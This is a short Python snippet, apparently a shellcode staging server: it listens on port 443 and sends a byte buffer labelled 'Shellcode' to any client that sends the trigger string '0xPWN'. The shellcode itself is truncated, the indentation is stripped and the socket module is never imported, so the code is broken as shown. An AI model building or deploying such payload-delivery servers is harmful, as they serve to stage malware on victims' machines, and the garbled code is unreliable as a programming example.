# Shellcode
buf =  b""
buf += b"\x48\x31\xc9..."

def server_program():
# Retrive hostname
host = "0.0.0.0"
port = 443  # initiate port no above 1024

server_socket = socket.socket()  # get instance
# The bind() function takes tuple as argument
server_socket.bind((host, port))  # bind host address and port together

# Configure how many client the server can listen simultaneously
server_socket.listen(2)
while True:
conn, address = server_socket.accept()  # accept new connection
print("Connection from: " + str(address))

# Receives data stream. It won't accept data packet greater than 1024 bytes
data = conn.recv(1024).decode()
print("from connected user: " + str(data))
if str(data).strip() == "0xPWN":
conn.send(buf) # send data to the client
conn.close()  # close the connection

if __name__ == '__main__':
server_program()
